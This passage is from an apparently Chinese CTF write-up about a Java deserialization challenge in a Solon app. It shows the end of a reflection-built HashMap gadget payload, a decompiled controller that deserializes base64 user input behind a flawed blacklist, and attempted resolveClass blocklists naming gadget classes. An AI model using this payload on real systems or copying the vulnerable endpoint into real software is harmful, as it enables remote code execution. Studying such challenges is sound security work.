        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token function">makeMap</span><span class="token punctuation">(</span>h1<span class="token punctuation">,</span>h2<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">HashMap</span> hashMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tpl<span class="token punctuation">,</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        user<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        user<span class="token punctuation">.</span><span class="token function">setInfo</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> makeMap <span class="token punctuation">(</span><span class="token class-name">Object</span> v1<span class="token punctuation">,</span> <span class="token class-name">Object</span> v2<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"size"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> nodeC<span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            nodeC <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.HashMap$Node"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span> <span class="token class-name">ClassNotFoundException</span> e <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            nodeC <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.HashMap$Entry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> nodeCons <span class="token operator">=</span> nodeC<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> nodeC<span class="token punctuation">)</span><span class="token punctuation">;</span>
        nodeCons<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Object</span> tbl <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>nodeC<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tbl<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nodeCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tbl<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> nodeCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"table"</span><span class="token punctuation">,</span> tbl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> s<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后本地打的时候没反应，正常反序列化没问题，试了下别的师傅的exp也不行，调试也调不了，抽象</p>
<h3 id="fix（Failed）"><a href="#fix（Failed）" class="headerlink" title="fix（Failed）"></a>fix（Failed）</h3><p>一点小问题：反编译的时候还反编译出了一个DemoController$1的子类，但是IDEA识别不到，不知道怎么回事</p>
<p>尝试继续重写resolveClass</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>json<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Mapping</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Post</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Controller</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoController</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">ModelAndView</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ModelAndView</span> model <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">"freemarker.ftl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        model<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token string">"/api"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> model<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">/*
     * WARNING - Removed try catching itself - possible behaviour change.
     */</span>
    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/log"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> filePath <span class="token operator">=</span> <span class="token string">"./logs/solon.log"</span><span class="token punctuation">;</span>
        <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token class-name">StringBuilder</span> stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">String</span> line<span class="token punctuation">;</span>
            reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">lineSeparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>reader <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    reader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/api"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@Post</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">api</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Context</span> ctx<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> jsonObject<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span><span class="token class-name">DemoController</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">boolean</span> check <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">private</span> <span class="token class-name">ArrayList</span> <span class="token class-name">Blacklist</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Hashtable</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">HashSet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">TreeMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">protected</span> <span class="token class-name">Class</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> targetc <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"commons.collections"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized"</span><span class="token punctuation">,</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson.JSON"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized"</span><span class="token punctuation">,</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"dont do this"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> targetc<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>来自光辉师傅のfix，通防？：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"asp"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.management"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"AbstractTranslet"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Fastjson"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"jmx"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"HashMap"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java.lang"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson.JSONArray"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"HashMap"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.swing"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> desc<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token class-name">Class</span> targetc <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>
